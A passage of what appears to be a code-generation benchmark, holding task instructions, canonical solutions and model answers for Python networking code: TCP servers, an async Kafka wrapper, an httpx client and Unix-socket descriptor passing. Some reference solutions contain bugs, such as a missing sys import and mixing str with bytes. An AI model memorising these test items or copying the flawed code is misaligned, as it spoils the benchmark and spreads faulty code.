conn.last_activity = current_time\n            return True\n        except socket.error:\n            return False\n\n    def _write_data(self, conn, current_time):\n        try:\n            while conn.out_queue:\n                data = conn.out_queue.popleft()\n                conn.sock.sendall(data)\n            conn.last_activity = current_time\n            return True\n        except socket.error:\n            return False\n\n    def _modify_connection_events(self, conn, io_events):\n        events = 0\n        if io_events & 1:\n            events |= selectors.EVENT_READ\n        if io_events & 2:\n            events |= selectors.EVENT_WRITE\n        if events:\n            self._selector.modify(conn.sock, events, data=conn)\n        else:\n            self._selector.unregister(conn.sock)\n\n    def _close_connection(self, conn):\n        self._selector.unregister(conn.sock)\n        self._close_socket(conn.sock)\n        del self._conns[conn.sock.fileno()]\n        self._num_sockets -= 1\n\n    def _close_socket(self, sock):\n        try:\n            sock.shutdown(socket.SHUT_RDWR)\n        except socket.error:\n            pass\n        finally:\n            sock.close()\n\n    def run(self):\n        while not self._want_abort:\n            current_time = time.time()\n            self._process_ready_sockets(current_time)"
  },
  {
    "Task_id": 397,
    "Instruction": "Task Description: Create a Python function that implements a TCP server which listens for client connections and sends the current server time upon connection.\n\nFunction Description: The function sets up a TCP server socket using IPv4, binds it to a specified IP address and port, listens for incoming connections, and sends the current datetime to each connected client before closing the connection. The server runs indefinitely until manually stopped.\n\nInput: None\n\nOutput: None (The function runs indefinitely, printing connection messages to console and sending datetime to clients)",
    "Canonical_solution": "from socket import socket, SOCK_STREAM, AF_INET\nfrom datetime import datetime\n\ndef main():\n    server = socket(family=AF_INET, type=SOCK_STREAM)\n    server.bind(('192.168.1.2', 6789))\n    server.listen(512)\n    print('\u670d\u52a1\u5668\u542f\u52a8\u5f00\u59cb\u76d1\u542c...')\n    while True:\n        client, addr = server.accept()\n        print(str(addr) + '\u8fde\u63a5\u5230\u4e86\u670d\u52a1\u5668.')\n        client.send(str(datetime.now()).encode('utf-8'))\n        client.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nfrom datetime import datetime\n\ndef start_time_server():\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_socket.bind(('0.0.0.0', 12345))\n    server_socket.listen(5)\n    print(\"Server is listening on port 12345...\")\n    \n    while True:\n        client_socket, addr = server_socket.accept()\n        print(f\"Connection from {addr}\")\n        current_time = datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\n        client_socket.sendall(current_time.encode())\n        client_socket.close()\n\nif __name__ == \"__main__\":\n    start_time_server()"
  },
  {
    "Task_id": 399,
    "Instruction": "Task Description: Create a TCP socket server class in Python that can handle incoming client connections, receive and process data, and send responses back to clients. The server should include error handling and callback methods for various events during its lifecycle.\n\nClass Description: MySocketServer is a TCP server implementation that listens on a specified host and port, accepts client connections, and handles data exchange. It provides hooks for custom behavior during different stages of server operation (startup, connection acceptance, data processing, etc.).\n\nAttributes:\n- host: str - The IP address or hostname to bind the server to\n- port: int - The port number to listen on\n- name: str - A descriptive name for the server (default: 'SocketServer')\n- numListen: int - Maximum number of queued connections (default: 1)\n- sock: socket.socket - The server socket object\n\nMethods:\n- __init__(host, port, name='SocketServer', numListen=1) -> None - Initializes the server with connection parameters\n- Run() -> None - Starts the server, binds to the specified address, and begins listening for connections\n- Stop() -> None - Stops the server by sending a special command to itself\n- onAccept(sock, addr) -> None - Handles a new client connection (sock: connection socket, addr: client address)\n- onData(sock, addr, data) -> None - Processes received data and sends a response (sock: connection socket, addr: client address, data: received bytes)\n- response(data) -> bytes - Generates a response for received data (data: input bytes) -> returns response bytes\n- onStartFail(e) -> None - Callback when server fails to start (e: exception object)\n- onStart() -> None - Callback when server starts successfully\n- onAcceptError(e) -> None - Callback when connection acceptance fails (e: exception object)\n- onRecvError(sock, addr, e) -> None - Callback when data receiving fails (sock: connection socket, addr: client address, e: exception object)\n- onSendError(sock, addr, e) -> None - Callback when data sending fails (sock: connection socket, addr: client address, e: exception object)\n- onStop() -> None - Callback when server stops\n\nStatic Methods:\n- Query(host, port, req) -> bytes - Helper function to send a request to a server and get response (host: target host, port: target port, req: request bytes) -> returns response bytes",
    "Canonical_solution": "import socket\nfrom qqbot.utf8logger import INFO, ERROR\nfrom qqbot.common import STR2BYTES\n\nclass MySocketServer:\n    def __init__(self, host, port, name='SocketServer', numListen=1):\n        self.host = host\n        self.port = int(port)\n        self.name = name\n        self.numListen = numListen\n\n    def Run(self):\n        try:\n            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            self.sock.bind((self.host, self.port))\n            self.sock.listen(self.numListen)\n            self.sock.settimeout(None)\n        except socket.error as e:\n            ERROR('\u65e0\u6cd5\u5f00\u542f %s \uff0c %s', self.name, e)\n            self.onStartFail(e)\n        else:\n            INFO('\u5df2\u5728 %s \u7684 %s \u7aef\u53e3\u5f00\u542f %s', self.host, self.port, self.name)\n            self.onStart()\n            while True:\n                try:\n                    sock, addr = self.sock.accept()\n                except socket.error as e:\n                    ERROR('%s \u53d1\u751f accept \u9519\u8bef\uff0c%s', self.name, e)\n                    self.onAcceptError(e)\n                else:\n                    self.onAccept(sock, addr)\n\n    def onAccept(self, sock, addr):\n        sock.settimeout(10.0)\n        try:\n            data = sock.recv(8192)\n        except socket.error as e:\n            ERROR('%s \u5728\u63a5\u6536\u6765\u81ea %s:%s \u7684\u6570\u636e\u65f6\u53d1\u9001\u9519\u8bef\uff0c%s', self.name, addr[0], addr[1], e)\n            self.onRecvError(sock, addr, e)\n            sock.close()\n        else:\n            if data == b'##STOP':\n                INFO('%s \u5df2\u505c\u6b62', self.name)\n                self.onStop()\n                sys.exit(0)\n            else:\n                self.onData(sock, addr, data)\n\n    def Stop(self):\n        Query(self.host, self.port, b'##STOP')\n\n    def onData(self, sock, addr, data):\n        try:\n            resp = self.response(data)\n        except Exception as e:\n            resp = '%s \u5728\u5904\u7406 %s:%s \u7684\u8bf7\u6c42\u65f6\u53d1\u751f\u9519\u8bef\uff0c%s' % (self.name, addr[0], addr[1], e)\n            ERROR(resp, exc_info=True)\n            resp = STR2BYTES(resp)\n\n        try:\n            sock.sendall(resp)\n        except socket.error as e:\n            ERROR('%s \u5728\u5411 %s:%s \u53d1\u9001\u6570\u636e\u65f6\u53d1\u9001\u9519\u8bef\uff0c%s', self.name, addr[0], addr[1], e)\n            self.onSendError(sock, addr, data)\n        finally:\n            sock.close()\n\n    def onStartFail(self, e):\n        pass\n\n    def onStart(self):\n        pass\n\n    def onAcceptError(self, e):\n        pass\n\n    def onRecvError(self, sock, addr, e):\n        pass\n\n    def onSendError(self, sock, addr, e):\n        pass\n\n    def onStop(self):\n        pass\n\n    def response(self, data):\n        return b'Hello, ' + data\n\ndef Query(host, port, req):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    resp = b''\n    try:\n        sock.connect((host, int(port)))\n        sock.sendall(req)\n        while True:\n            data = sock.recv(8096)\n            if not data:\n                return resp\n            else:\n                resp += data\n    except socket.error:\n        return resp\n    finally:\n        sock.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport threading\nimport sys\n\nclass MySocketServer:\n    def __init__(self, host, port, name='SocketServer', numListen=1):\n        self.host = host\n        self.port = port\n        self.name = name\n        self.numListen = numListen\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.running = False\n        self.server_thread = None\n\n    def Run(self):\n        try:\n            self.sock.bind((self.host, self.port))\n            self.sock.listen(self.numListen)\n            self.running = True\n            self.onStart()\n            \n            self.server_thread = threading.Thread(target=self._accept_connections)\n            self.server_thread.start()\n        except Exception as e:\n            self.onStartFail(e)\n\n    def _accept_connections(self):\n        while self.running:\n            try:\n                sock, addr = self.sock.accept()\n                self.onAccept(sock, addr)\n                \n                client_thread = threading.Thread(target=self._handle_client, args=(sock, addr))\n                client_thread.start()\n            except Exception as e:\n                self.onAcceptError(e)\n\n    def _handle_client(self, sock, addr):\n        try:\n            data = sock.recv(4096)\n            if data:\n                self.onData(sock, addr, data)\n        except Exception as e:\n            self.onRecvError(sock, addr, e)\n        \n        try:\n            sock.close()\n        except:\n            pass\n\n    def onData(self, sock, addr, data):\n        try:\n            response_data = self.response(data)\n            sock.sendall(response_data)\n        except Exception as e:\n            self.onSendError(sock, addr, e)\n\n    def response(self, data):\n        return b\"Server received: \" + data\n\n    def Stop(self):\n        self.running = False\n        try:\n            temp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            temp_sock.connect((self.host, self.port))\n            temp_sock.close()\n        except:\n            pass\n        \n        if self.server_thread:\n            self.server_thread.join()\n        \n        try:\n            self.sock.close()\n        except:\n            pass\n        \n        self.onStop()\n\n    def onStartFail(self, e):\n        pass\n\n    def onStart(self):\n        print(f\"{self.name} started\")\n\n    def onAcceptError(self, e):\n        pass\n\n    def onRecvError(self, sock, addr, e):\n        pass\n\n    def onSendError(self, sock, addr, e):\n        pass\n\n    def onStop(self):\n        print(f\"{self.name} stopped\")\n\n    @staticmethod\n    def Query(host, port, req):\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((host, port))\n            s.sendall(req)\n            response = s.recv(4096)\n            return response"
  },
  {
    "Task_id": 4,
    "Instruction": "Task Description: Create an asynchronous Kafka environment class for inter-process communication that can both consume and produce messages using aiokafka.\n\nClass Description: AsyncKafkaEnvironment is a class that provides asynchronous Kafka message consumption and production capabilities. It handles initialization of Kafka consumers and producers, message sending, batch data retrieval, and proper resource cleanup.\n\nAttributes:\nkafka_bootstrap_servers: Optional[Union[str, List[str]]] - Kafka broker addresses as string or list of strings\nkafka_input_topic: Optional[str] - Topic name for consuming messages\nkafka_output_topic: Optional[str] - Topic name for producing messages\ntimeout_ms: Optional[int] - Timeout in milliseconds for consumer operations\nconsumer: Optional[AIOKafkaConsumer] - Async Kafka consumer instance\nproducer: Optional[AIOKafkaProducer] - Async Kafka producer instance\n\nMethods:\ninitialize() -> None - Initializes the Kafka consumer and producer instances with configured settings. Validates required attributes are set before initialization.\nfinalize() -> None - Gracefully stops both consumer and producer instances to clean up resources.\nmessage_sender(producer: AIOKafkaProducer, data: Iterable, topic: str) -> None - Sends data to specified Kafka topic using the provided producer instance.\nget_data_batch(batch_size: Optional[int]) -> list - Retrieves a batch of messages from the input topic, with optional size limit. Returns list of message values.",
    "Canonical_solution": "import logging\nimport json\nfrom typing import Union, List, Optional, Iterable\nfrom aiokafka import AIOKafkaConsumer, AIOKafkaProducer\n\nlogger = logging.getLogger(__name__)\n\nclass AsyncKafkaEnvironment:\n    \"\"\"\n    Represents an asynchronous Kafka environment for inter-process communication.\n    \"\"\"\n    \n    kafka_bootstrap_servers: Optional[Union[str, List[str]]] = None\n    kafka_input_topic: Optional[str] = None\n    kafka_output_topic: Optional[str] = None\n    timeout_ms: Optional[int] = None\n    consumer: Optional[AIOKafkaConsumer] = None\n    producer: Optional[AIOKafkaProducer] = None\n\n    async def initialize(self):\n        assert self.kafka_bootstrap_servers is not None, \"missing initialization for kafka_bootstrap_servers\"\n        assert self.kafka_input_topic is not None, \"missing initialization for kafka_input_topic\"\n        assert self.kafka_output_topic is not None, \"missing initialization for kafka_output_topic\"\n        assert self.timeout_ms is not None, \"missing initialization for timeout_ms\"\n\n        self.consumer = AIOKafkaConsumer(\n            self.kafka_input_topic,\n            bootstrap_servers=self.kafka_bootstrap_servers,\n            value_deserializer=lambda v: json.loads(v.decode(\"utf-8\")),\n            auto_offset_reset=\"earliest\",\n            max_partition_fetch_bytes=3000000,\n        )\n        await self.consumer.start()\n\n        self.producer = AIOKafkaProducer(\n            bootstrap_servers=self.kafka_bootstrap_servers,\n            value_serializer=lambda v: json.dumps(v).encode(\"utf-8\"),\n            max_request_size=3000000,\n            acks=\"all\",\n        )\n        await self.producer.start()\n\n    async def finalize(self):\n        if self.consumer:\n            await self.consumer.stop()\n        if self.producer:\n            await self.producer.stop()\n\n    async def message_sender(self, producer: AIOKafkaProducer, data: Iterable, topic: str):\n        try:\n            await producer.send_and_wait(topic, value=data)\n            logger.info(f\"The number of records sent to topic:{topic}, record_no:{len(data)}\")\n        finally:\n            pass\n\n    async def get_data_batch(self, batch_size: Optional[int]) -> list:\n        batch = await self.consumer.getmany(\n            timeout_ms=self.timeout_ms, max_records=batch_size\n        )\n\n        if len(batch) == 0:\n            batch_data = []\n        elif len(batch) > 1:\n            logger.error(\n                f\"consumer should be subscribed to only one topic and partition, not {list(batch.keys())}\"\n            )\n            batch_data = []\n        else:\n            for topic_partition, messages in batch.items():\n                batch_data = [msg.value for msg in messages]\n\n            logger.info(\n                f\"Received a batch with number_of_messages:{len(batch_data)} records from Kafka input_topic:{self.kafka_input_topic}\"\n            )\n        return batch_data",
    "Code_level": "Class-level",
    "FSMID_for_test": 80,
    "right_result": "from aiokafka import AIOKafkaConsumer, AIOKafkaProducer\nfrom typing import Optional, Union, Iterable\nimport asyncio\n\nclass AsyncKafkaEnvironment:\n    def __init__(\n        self,\n        kafka_bootstrap_servers: Optional[Union[str, list]] = None,\n        kafka_input_topic: Optional[str] = None,\n        kafka_output_topic: Optional[str] = None,\n        timeout_ms: Optional[int] = 1000,\n    ):\n        self.kafka_bootstrap_servers = kafka_bootstrap_servers\n        self.kafka_input_topic = kafka_input_topic\n        self.kafka_output_topic = kafka_output_topic\n        self.timeout_ms = timeout_ms\n        self.consumer = None\n        self.producer = None\n\n    async def initialize(self):\n        if not self.kafka_bootstrap_servers:\n            raise ValueError(\"kafka_bootstrap_servers must be set\")\n        if not self.kafka_input_topic:\n            raise ValueError(\"kafka_input_topic must be set\")\n        if not self.kafka_output_topic:\n            raise ValueError(\"kafka_output_topic must be set\")\n\n        self.consumer = AIOKafkaConsumer(\n            self.kafka_input_topic,\n            bootstrap_servers=self.kafka_bootstrap_servers,\n            enable_auto_commit=False,\n            group_id=\"async_kafka_env_group\",\n            value_deserializer=lambda v: v.decode(\"utf-8\"),\n        )\n\n        await self.consumer.start()\n\n        self.producer = AIOKafkaProducer(\n            bootstrap_servers=self.kafka_bootstrap_servers,\n            value_serializer=lambda v: v.encode(\"utf-8\"),\n        )\n\n        await self.producer.start()\n\n    async def finalize(self):\n        if self.consumer:\n            await self.consumer.stop()\n        if self.producer:\n            await self.producer.stop()\n\n    async def message_sender(self, producer: AIOKafkaProducer, data: Iterable, topic: str):\n        tasks = [producer.send(topic, value=item) for item in data]\n        await asyncio.gather(*tasks)\n\n    async def get_data_batch(self, batch_size: Optional[int] = None) -> list:\n        if not self.consumer:\n            raise RuntimeError(\"Consumer not initialized. Call initialize() first.\")\n\n        messages = []\n        try:\n            async for msg in self.consumer:\n                messages.append(msg.value)\n                if batch_size and len(messages) >= batch_size:\n                    break\n        except Exception as e:\n            print(f\"Error consuming messages: {e}\")\n\n        return messages"
  },
  {
    "Task_id": 40,
    "Instruction": "Task Description: Create an asynchronous HTTP client class in Python using httpx and asyncio libraries to perform various HTTP operations including GET, POST, file downloads, and image retrieval with progress tracking and error handling.\n\nClass Description: AsyncHTTPClient is a utility class that provides static methods for performing asynchronous HTTP operations. It handles common HTTP methods, file downloads with progress tracking, and image retrieval/saving functionality.\n\nMethods:\n\nMethod1: get(url: str, *, headers: Optional[Dict[str, str]] = None, params: Optional[Dict[str, Any]] = None, timeout: Optional[int] = 20, **kwargs) -> httpx.Response\n- Performs an asynchronous HTTP GET request to the specified URL with optional headers, query parameters, and timeout. Returns the HTTP response.\n\nMethod2: post(url: str, *, headers: Optional[Dict[str, str]] = None, params: Optional[Dict[str, Any]] = None, data: Optional[Dict[str, Any]] = None, json: Optional[Dict[str, Union[Any, str]]] = None, timeout: Optional[int] = 20, **kwargs) -> httpx.Response\n- Performs an asynchronous HTTP POST request to the specified URL with optional headers, query parameters, form data, JSON payload, and timeout. Returns the HTTP response.\n\nMethod3: download(url: str, save_path: Path, exclude_json: bool = False) -> None\n- Downloads a file from the specified URL asynchronously with progress tracking. Saves to the specified path while optionally excluding JSON content. Raises exception if content type doesn't match.\n\nMethod4: get_img(url: str, *, headers: Optional[Dict[str, str]] = None, params: Optional[Dict[str, Any]] = None, timeout: Optional[int] = 20, save_path: Optional[Union[str, Path]] = None, **kwargs) -> Union[None, Image.Image]\n- Retrieves an image from the specified URL asynchronously. Can optionally save to disk and returns a PIL Image object or None if the content isn't an image.",
    "Canonical_solution": "import httpx\nfrom typing import Dict, Optional, Any, Union\nfrom pathlib import Path\nfrom io import BytesIO\nfrom PIL import Image\nimport tqdm.asyncio\n\nclass AsyncHTTPClient:\n    @staticmethod\n    async def get(url: str,\n                 *,\n                 headers: Optional[Dict[str, str]] = None,\n                 params: Optional[Dict[str, Any]] = None,\n                 timeout: Optional[int] = 20,\n                 **kwargs) -> httpx.Response:\n        async with httpx.AsyncClient() as client:\n            return await client.get(url,\n                                  headers=headers,\n                                  params=params,\n                                  timeout=timeout,\n                                  **kwargs)\n\n    @staticmethod\n    async def post(url: str,\n                  *,\n                  headers: Optional[Dict[str, str]] = None,\n                  params: Optional[Dict[str, Any]] = None,\n                  data: Optional[Dict[str, Any]] = None,\n                  json: Optional[Dict[str, Union[Any, str]]] = None,\n                  timeout: Optional[int] = 20,\n                  **kwargs) -> httpx.Response:\n        async with httpx.AsyncClient() as client:\n            return await client.post(url,\n                                   headers=headers,\n                                   params=params,\n                                   data=data,\n                                   json=json,\n                                   timeout=timeout,\n                                   **kwargs)\n\n    @staticmethod\n    async def download(url: str, save_path: Path, exclude_json: bool = False):\n        save_path.parent.mkdir(parents=True, exist_ok=True)\n        async with httpx.AsyncClient().stream(method='GET', url=url, follow_redirects=True) as datas:\n            if exclude_json and 'application/json' in str(datas.headers['Content-Type']):\n                raise Exception('file not match type')\n            size = int(datas.headers['Content-Length'])\n            f = save_path.open('wb')\n            async for chunk in tqdm.asyncio.tqdm(iterable=datas.aiter_bytes(1),\n                                               desc=url.split('/')[-1],\n                                               unit='iB',\n                                               unit_scale=True,\n                                               unit_divisor=1024,\n                                               total=size,\n                                               colour='green'):\n                f.write(chunk)\n            f.close()\n\n    @staticmethod\n    async def get_img(url: str,\n                     *,\n                     headers: Optional[Dict[str, str]] = None,\n                     params: Optional[Dict[str, Any]] = None,\n                     timeout: Optional[int] = 20,\n                     save_path: Optional[Union[str, Path]] = None,\n                     **kwargs) -> Union[None, Image.Image]:\n        if save_path and Path(save_path).exists():\n            return Image.open(save_path)\n        \n        async with httpx.AsyncClient() as client:\n            resp = await client.get(url,\n                                  headers=headers,\n                                  params=params,\n                                  timeout=timeout,\n                                  **kwargs)\n            if resp.headers.get('Content-Type') not in ['image/png', 'image/jpeg']:\n                return None\n            resp = resp.read()\n            img = Image.open(BytesIO(resp))\n            \n            if save_path:\n                save_path = Path(save_path)\n                save_path.parent.mkdir(parents=True, exist_ok=True)\n                img.save(save_path)\n            return img",
    "Code_level": "Class-level",
    "FSMID_for_test": 59,
    "right_result": "import httpx\nimport asyncio\nfrom typing import Optional, Dict, Any, Union\nfrom pathlib import Path\nfrom PIL import Image\nimport io\n\nclass AsyncHTTPClient:\n    @staticmethod\n    async def get(url: str, *, headers: Optional[Dict[str, str]] = None, params: Optional[Dict[str, Any]] = None, timeout: Optional[int] = 20, **kwargs) -> httpx.Response:\n        async with httpx.AsyncClient() as client:\n            response = await client.get(url, headers=headers, params=params, timeout=timeout, **kwargs)\n            response.raise_for_status()\n            return response\n\n    @staticmethod\n    async def post(url: str, *, headers: Optional[Dict[str, str]] = None, params: Optional[Dict[str, Any]] = None, data: Optional[Dict[str, Any]] = None, json: Optional[Dict[str, Union[Any, str]]] = None, timeout: Optional[int] = 20, **kwargs) -> httpx.Response:\n        async with httpx.AsyncClient() as client:\n            response = await client.post(url, headers=headers, params=params, data=data, json=json, timeout=timeout, **kwargs)\n            response.raise_for_status()\n            return response\n\n    @staticmethod\n    async def download(url: str, save_path: Path, exclude_json: bool = False) -> None:\n        async with httpx.AsyncClient() as client:\n            with open(save_path, \"wb\") as f:\n                async with client.stream(\"GET\", url) as response:\n                    content_type = response.headers.get(\"Content-Type\", \"\")\n                    if exclude_json and \"application/json\" in content_type:\n                        raise ValueError(\"JSON content is excluded from downloading.\")\n                    total_bytes = 0\n                    async for chunk in response.aiter_bytes():\n                        f.write(chunk)\n                        total_bytes += len(chunk)\n                        print(f\"\\rDownloaded {total_bytes} bytes...\", end=\"\")\n        print(\"\\nDownload completed.\")\n\n    @staticmethod\n    async def get_img(url: str, *, headers: Optional[Dict[str, str]] = None, params: Optional[Dict[str, Any]] = None, timeout: Optional[int] = 20, save_path: Optional[Union[str, Path]] = None, **kwargs) -> Union[None, Image.Image]:\n        async with httpx.AsyncClient() as client:\n            response = await client.get(url, headers=headers, params=params, timeout=timeout, **kwargs)\n            response.raise_for_status()\n            content_type = response.headers.get(\"Content-Type\", \"\")\n            if not content_type.startswith(\"image/\"):\n                return None\n            image_data = io.BytesIO(response.content)\n            image = Image.open(image_data)\n            if save_path:\n                with open(save_path, \"wb\") as img_file:\n                    img_file.write(response.content)\n            return image"
  },
  {
    "Task_id": 400,
    "Instruction": "Task Description: Implement a TCP server that accepts client connections and forwards their file descriptors to a worker process over a Unix domain socket.\n\nFunction Description: The code consists of two main functions. `send_fd()` handles sending a file descriptor over a Unix domain socket, while `server()` sets up both the Unix domain socket for worker communication and the TCP server for client connections. The server continuously accepts TCP clients, sends their file descriptors to the worker, and closes the client connection.\n\nInput:\n- `send_fd()`:\n  - `sock`: [socket.socket] - A connected Unix domain socket\n  - `fd`: [int] - File descriptor to send\n- `server()`:\n  - `work_address`: [str] - Path for the Unix domain socket\n  - `port`: [int] - TCP port number to listen on\n\nOutput:\n- `send_fd()`: None (but expects 'OK' acknowledgment from receiver)\n- `server()`: None (runs indefinitely serving clients)",
    "Canonical_solution": "import socket\nimport struct\n\ndef send_fd(sock, fd):\n    '''\n    Send a single file descriptor.\n    '''\n    sock.sendmsg([b'x'],\n                 [(socket.SOL_SOCKET, socket.SCM_RIGHTS, struct.pack('i', fd))])\n    ack = sock.recv(2)\n    assert ack == b'OK'\n\ndef server(work_address, port):\n    # Wait for the worker to connect\n    work_serv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n    work_serv.bind(work_address)\n    work_serv.listen(1)\n    worker, addr = work_serv.accept()\n\n    # Now run a TCP/IP server and send clients to worker\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)\n    s.bind(('',port))\n    s.listen(1)\n    while True:\n        client, addr = s.accept()\n        print('SERVER: Got connection from', addr)\n        send_fd(worker, client.fileno())\n        client.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport os\nimport struct\nimport subprocess\nimport signal\n\ndef send_fd(sock, fd):\n    sock.sendmsg([b'FD'], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, struct.pack('i', fd))])\n    ack = sock.recv(2)\n    return None\n\ndef server(work_address, port):\n    worker = subprocess.Popen(['worker_process', work_address])\n    signal.signal(signal.SIGTERM, lambda *args: (worker.terminate(), os._exit(0)))\n    \n    with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as unix_sock:\n        unix_sock.bind(work_address)\n        unix_sock.listen(1)\n        work_conn, _ = unix_sock.accept()\n        \n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tcp_sock:\n        tcp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        tcp_sock.bind(('0.0.0.0', port))\n        tcp_sock.listen(5)\n        \n        while True:\n            client, _ = tcp_sock.accept()\n            send_fd(work_conn, client.fileno())\n            client.close()"
  },
  {
    "Task_id": 401,
    "Instruction": "Task Description: Implement a multithreaded TCP echo server that receives data from a client, processes it, and sends it back to the client in chunks. The server should handle client connections in a separate thread and support graceful termination when receiving a \"QUIT\" command.\n\nClass Description: EchoServer is a threaded TCP server that echoes received data back to the client. It handles one client connection at a time, processes incoming data, and sends it back in configurable chunk sizes. The server can be configured to delay resending until triggered by an external event.\n\nAttributes:\n- host: str - The host IP address to bind the server to\n- port: int - The port number to listen on\n- sock: socket.socket - The TCP socket object for server operations\n- buffer: str - Accumulates received data before echoing back\n- start_resend_event: threading.Event - Optional event to trigger when to start echoing data back\n- chunk_size: int - Size of data chunks to send back to client (default: 1 byte)\n\nMethods:\n- __init__(host: str, port: int) -> None - Initializes the server with host and port\n- run() -> None - Main thread method that handles client connection, data reception, and echoing back data. Runs in a separate thread when started. Processes data until \"QUIT\" is received or connection is closed.",
    "Canonical_solution": "import socket\nimport threading\nimport time\n\nclass EchoServer(threading.Thread):\n    def __init__(self, host, port):\n        threading.Thread.__init__(self)\n        self.host = host\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.buffer = \"\"\n        self.start_resend_event = None\n        self.chunk_size = 1\n\n    def run(self):\n        self.sock.bind((self.host, self.port))\n        self.sock.listen(1)\n        conn, client = self.sock.accept()\n        \n        while True:\n            data = conn.recv(1)\n            if not data:\n                break\n            self.buffer += data\n            if \"QUIT\\n\" in self.buffer:\n                break\n\n        self.buffer = self.buffer.replace(\"QUIT\\n\", '')\n\n        if self.start_resend_event:\n            self.start_resend_event.wait()\n\n        try:\n            while self.buffer:\n                n = conn.send(self.buffer[:self.chunk_size])\n                time.sleep(0.001)\n                self.buffer = self.buffer[n:]\n        except:\n            pass\n\n        conn.close()\n        self.sock.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport threading\n\nclass EchoServer:\n    def __init__(self, host: str, port: int) -> None:\n        self.host = host\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.sock.bind((host, port))\n        self.buffer = \"\"\n        self.start_resend_event = threading.Event()\n        self.chunk_size = 1\n        self.client_connected = False\n\n    def run(self) -> None:\n        self.sock.listen(1)\n        conn, addr = self.sock.accept()\n        self.client_connected = True\n        try:\n            while True:\n                data = conn.recv(1024).decode()\n                if not data:\n                    break\n                self.buffer += data\n                if \"QUIT\" in self.buffer:\n                    break\n                if self.start_resend_event.is_set():\n                    while self.buffer:\n                        chunk = self.buffer[:self.chunk_size]\n                        conn.sendall(chunk.encode())\n                        self.buffer = self.buffer[self.chunk_size:]\n            conn.close()\n        finally:\n            self.sock.close()"
  },
  {
    "Task_id": 402,
    "Instruction": "Task Description: Implement a TCP server-client communication system in Python using socket programming and multiprocessing. The system should allow for asynchronous handling of client connections and bidirectional data exchange.\n\nClass Description: The system consists of two main classes: TCPServer for handling incoming connections and TCPClient for establishing connections to the server. The TCPServer runs in a separate process to handle client connections asynchronously.\n\nAttributes:\n- TCPServer:\n  - port: int - The port number on which the server listens for connections\n  - process: Process - The multiprocessing Process object running the server\n  - is_running: bool - Flag indicating whether the server is currently running\n\n- TCPClient:\n  - port: int - The port number to connect to on the server\n  - sock: socket - The TCP socket object for communication with the server\n\nMethods:\n- TCPServer:\n  - start() -> None - Starts the server in a separate process\n  - stop() -> None - Stops the server process\n  - _subprocess_server_tcp(port: int) -> None - Internal method running in the subprocess to handle client connections (accepts connections and echoes received data)\n\n- TCPClient:\n  - send(data: Union[str, bytes]) -> bytes - Sends data to the server and returns the response\n  - close() -> None - Closes the client connection\n  - __del__() -> None - Destructor that ensures proper connection cleanup",
    "Canonical_solution": "import socket\nfrom multiprocessing import Process\nimport os\nimport time\n\nclass TCPServer:\n    def __init__(self, port):\n        self.port = int(port)\n        self.process = None\n        self.is_running = False\n\n    def start(self):\n        args = [self.port]\n        self.process = Process(target=self._subprocess_server_tcp, args=args)\n        self.process.start()\n        time.sleep(1)\n        self.is_running = True\n\n    def stop(self):\n        try:\n            os.kill(self.process.pid, 9)\n        except OSError:\n            self.process.terminate()\n        finally:\n            self.is_running = False\n\n    def _subprocess_server_tcp(self, port):\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.bind(('localhost', port))\n        s.listen(True)\n        conn, addr = s.accept()\n\n        while True:\n            data = conn.recv(1024)\n            conn.send(b\"RECEIVED: \" + bytes(data))\n\n        conn.close()\n\nclass TCPClient:\n    def __init__(self, port):\n        self.port = int(port)\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.connect(('localhost', self.port))\n\n    def send(self, data):\n        if isinstance(data, str):\n            data = data.encode('utf-8')\n\n        self.sock.sendall(data)\n        return self.sock.recv(len(data) + 11)\n\n    def close(self):\n        try:\n            self.sock.close()\n        except socket.error:\n            pass\n\n    def __del__(self):\n        self.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport multiprocessing\nfrom typing import Union\n\nclass TCPServer:\n    def __init__(self, port: int):\n        self.port = port\n        self.process = multiprocessing.Process(target=self._subprocess_server_tcp, args=(self.port,))\n        self.is_running = False\n\n    def start(self) -> None:\n        self.is_running = True\n        self.process.start()\n\n    def stop(self) -> None:\n        self.is_running = False\n        self.process.terminate()\n        self.process.join()\n\n    def _subprocess_server_tcp(self, port: int) -> None:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:\n            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            server_socket.bind(('localhost', port))\n            server_socket.listen(5)\n            while self.is_running:\n                try:\n                    client_socket, addr = server_socket.accept()\n                    with client_socket:\n                        while self.is_running:\n                            data = client_socket.recv(1024)\n                            if not data:\n                                break\n                            client_socket.sendall(data)\n                except Exception:\n                    continue\n\nclass TCPClient:\n    def __init__(self, port: int):\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n    def 